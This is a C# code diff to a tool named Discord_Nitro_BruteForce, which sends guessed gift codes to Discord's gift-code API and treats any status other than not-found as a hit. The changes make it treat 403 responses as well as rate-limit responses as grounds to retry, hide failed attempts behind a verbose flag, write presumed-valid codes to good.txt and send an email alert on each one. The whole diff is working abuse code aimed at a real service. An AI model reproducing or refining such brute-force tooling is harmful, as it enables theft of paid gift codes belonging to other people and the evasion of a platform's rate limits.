@@ -22,10 +22,13 @@ namespace Discord_Nitro_BruteForce
             {
                 HttpResponse res = req.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}");
 
-                if(res.StatusCode == HttpStatusCode.TooManyRequests)
+                if(res.StatusCode == HttpStatusCode.TooManyRequests || res.StatusCode == HttpStatusCode.Forbidden)
                 {
-                    Console.ForegroundColor = ConsoleColor.Yellow;
-                    Console.WriteLine($"[RATELIMIT] {code}");
+                    if (Program.verbose)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine($"[-] {code}: {res.StatusCode}");
+                    }
                     throw new HttpException();
                 }
                     
@@ -33,25 +36,28 @@ namespace Discord_Nitro_BruteForce
 
                 if(res.StatusCode == HttpStatusCode.NotFound)
                 {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine($"[-] {code}");
-                }
-
-                if (res.StatusCode == HttpStatusCode.OK)
-                {
-                    Interlocked.Increment(ref Program.goods);
-
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"[+] {code}");
-
-                    lock (fileLocker)
+                    if (Program.verbose)
                     {
-                        File.AppendAllText("good.txt", code);
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine($"[-] {code}");
                     }
-
-                    if (Program.emailnotification)
-                        Program.SendEmail(code, "Hey! I founded valid code!");
+                    return;
                 }
+
+                //if (res.StatusCode == HttpStatusCode.OK || res.StatusCode == HttpStatusCode.Found || res.StatusCode == HttpStatusCode.Accepted)
+                //{
+                Interlocked.Increment(ref Program.goods);
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[+] {code} (StatusCode: {(int)res.StatusCode})"); //I don't know status code of valid nitro gift
+
+                lock (fileLocker)
+                {
+                    File.AppendAllText("good.txt", code);
+                }
+
+                if (Program.emailnotification)
+                    Program.SendEmail(code, "Hey! I founded valid code!");
+                //}
             }
         }
     }
